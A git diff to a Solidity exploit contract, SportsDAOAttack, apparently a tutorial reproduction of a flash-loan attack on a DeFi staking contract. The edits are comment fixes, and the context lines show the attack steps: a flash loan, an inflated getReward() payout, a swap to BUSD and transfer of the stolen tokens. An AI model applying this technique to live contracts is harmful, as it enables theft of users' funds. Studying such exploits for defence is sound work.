@@ -97,7 +97,7 @@ contract SportsDAOAttack {
     flashLoaner.flashLoan(0, 500 ether, address(this), 'A');
     console.log('BUSD balance after attack: ', busd.balanceOf(address(this)) / 1 ether);
 
-    // Transfer all the we stole BUSD to ourselves
+    // Transfer all the stolen BUSD to ourselves
     busd.transfer(msg.sender, busd.balanceOf(address(this)));
   }
 
@@ -157,8 +157,8 @@ contract SportsDAOAttack {
     // Now claim reward.
     //
     // The `updateReward()` modifier will set `PerTokenRewardLast` to an a high
-    // value since the amount of sDAO left in the contract is so little. This
-    // will cause us to get a huge reward.
+    // value since the amount of LP tokens left in the contract is so little.
+    // This will cause us to get a huge reward.
     sdao.getReward();
 
     // Swap all our sDAO for BUSD
@@ -172,6 +172,10 @@ contract SportsDAOAttack {
       address(this),
       block.timestamp * 5
     );
+
+    // Still have a bit of BUSD-sDAO LP tokens left in this contract. Can be
+    // swapped back to BUSD and sDAO tokens using the router's
+    // `removeLiquidity()` function. Left as an exercise for the reader.
 
     // Return the BUSD we flash loaned
     busd.transfer(address(flashLoaner), 500 ether);
